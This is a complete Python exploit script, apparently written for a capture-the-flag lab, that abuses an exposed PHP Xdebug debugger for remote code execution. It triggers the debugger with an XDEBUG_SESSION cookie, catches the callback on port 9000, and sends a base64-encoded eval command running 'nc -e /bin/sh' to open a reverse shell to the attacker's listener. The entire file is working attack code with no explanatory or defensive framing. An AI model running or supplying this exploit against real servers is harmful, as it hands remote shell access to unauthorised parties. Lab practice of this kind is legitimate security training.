#!/usr/bin/env python3

from base64 import b64encode
import requests
import socket
import sys


if len(sys.argv) != 2:
    print("{} [nc port]".format(sys.argv[0]))
    sys.exit()

def get_my_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("10.10.16.8", 80))
    return s.getsockname()[0]

ip = get_my_ip()
port = sys.argv[1]

print("[!] Have nc listening on {}".format(port))

# Start Listener
local_ip = "0.0.0.0"
local_port = 9000
print("[*] Starting listener on {}:{}".format(local_ip, local_port))
s = socket.socket()
s.bind((local_ip, local_port))
s.listen(10)
print("[+] Listening...")

# Tip server to call back
print("[*] Sending request to tip xdebug")
try:
    r = requests.get("http://10.129.147.242/index.php",
                 headers={"Cookie": "XDEBUG_SESSION=wpOCvcWXx5"},
                timeout=2)
except:
    pass

# Catch callback
conn, addr = s.accept()
client_data = conn.recv(1024)
print("[+] Connection received from {}:{} on port {}".format(addr[0], addr[1], local_port))
cmd = 'system("nc -e /bin/sh {} {}")'.format(ip, port).encode('utf-8')
print("[*] Sending command get shell on port {}".format(port))
conn.sendall(('eval -i 1 -- %s\x00' % b64encode(cmd).decode('utf-8')).encode('utf-8'))

print("[*] Cleaning up. Should have callback")
s.close()
conn.close()
